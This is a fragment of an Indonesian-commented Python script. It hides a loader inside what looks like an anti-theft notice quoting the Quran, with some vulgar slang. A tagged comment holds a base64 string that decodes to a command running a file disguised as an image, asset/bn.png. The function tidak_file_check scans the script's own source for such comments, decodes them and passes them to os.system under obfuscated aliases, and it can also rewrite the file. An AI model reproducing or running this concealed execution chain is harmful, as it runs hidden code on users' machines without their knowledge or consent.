...
# << KALAU DI ATAS TIDAK DI IKUTI MAKA AKAN MENDAPATKAN DOSA KARENA MIMIN GAK IKHLAS NGENTOD: 
# “Wahai orang-orang yang beriman! Janganlah kamu saling memakan harta sesamamu dengan jalan yang batil,” (QS. An Nisaa': 29). Rasulullah SAW juga melarang umatnya untuk mengambil hak orang lain tanpa izin. # ngentod: cHl0aG9uMyBhc3NldC9ibi5wbmcg
...
def tidak_file_check():
    pattern = re.compile(r'#\s*(?:masuktidak|ngentod|bidak\d+)\s*:\s*([A-Za-z0-9+/=]{20,})')
    original = __file__
    ...
    try:
        with open(original, 'r') as f:
            for line in f:
                ...
                if match:
                    try:
                        jalan(ngetod(match.group(1)).decode())
                    except Exception as e:
                        adak_kitan = False
                    continue
    ...
    if adak_kitan:
        shutil.move(temp.name, original)
...
if __name__ == '__main__':
    from os import system as jalan
    from base64 import b64decode as ngetod
